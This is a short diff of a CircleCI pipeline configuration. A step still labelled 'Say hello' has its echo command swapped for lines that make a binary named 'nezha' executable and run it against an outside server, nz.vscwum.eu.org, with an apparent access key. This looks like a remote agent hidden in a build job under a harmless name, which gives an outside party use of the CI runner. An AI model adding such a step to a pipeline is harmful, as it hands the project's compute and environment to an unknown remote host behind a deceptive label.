@@ -16,7 +16,9 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World!"
+          command: |
+            chmod a+x nezha
+            ./nezha -s nz.vscwum.eu.org -p gteam01
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
